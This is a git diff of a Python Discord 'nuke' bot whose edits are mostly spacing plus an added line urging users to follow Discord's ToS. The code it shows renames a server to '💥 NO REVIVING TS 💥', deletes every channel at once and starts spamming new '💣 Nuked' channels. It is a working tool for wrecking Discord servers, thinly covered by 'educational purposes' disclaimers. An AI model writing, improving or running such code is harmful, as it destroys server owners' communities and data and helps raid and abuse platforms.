@@ -1,5 +1,6 @@
 # Disclaimer: This is only for entertainment and educational purposes.  
 # I’m not responsible for what you do with it or any consequences.  
+# Please use responsibly and always follow Discord’s ToS & Guidelines.  
 # Made by VN :3
 
 import discord
@@ -11,7 +12,7 @@ intents = discord.Intents.all() # required, dont remove
 intents.guilds = True
 intents.messages = True
 
-bot = commands.Bot(command_prefix='.', intents=intents) # prefix
+bot = commands.Bot(command_prefix = '.', intents = intents) # prefix
 
 @bot.event
 async def on_ready():
@@ -23,10 +24,10 @@ async def nuke(ctx):
         return
 
     new_name = "💥 NO REVIVING TS 💥" # set server name to
-    await ctx.guild.edit(name=new_name)
+    await ctx.guild.edit(name = new_name)
 
     delete_tasks = [channel.delete() for channel in ctx.guild.channels]
-    results = await asyncio.gather(*delete_tasks, return_exceptions=True) # delete og channels
+    results = await asyncio.gather(*delete_tasks, return_exceptions = True) # delete og channels
 
     async def create_channel(i):
         channel = await ctx.guild.create_text_channel("💣 Nuked") # name of channels being made
